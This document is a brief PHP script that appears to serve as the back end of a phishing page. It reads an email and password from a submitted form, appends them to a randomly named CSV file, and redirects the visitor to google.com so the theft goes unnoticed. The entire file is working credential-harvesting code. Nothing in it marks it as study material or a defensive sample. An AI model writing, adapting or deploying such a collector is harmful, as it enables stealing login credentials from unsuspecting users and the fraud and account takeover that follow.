<?php 

	header('Location: http://google.com');

	$email=htmlspecialchars($_POST['email']);
	
	$password=htmlspecialchars($_POST['password']);

	$data=array("email" => $email, "password" => $password);

	$file_handler=fopen("c0egand1G7.csv","a");

	fputcsv($file_handler,$data,";");

	fclose($file_handler);


?>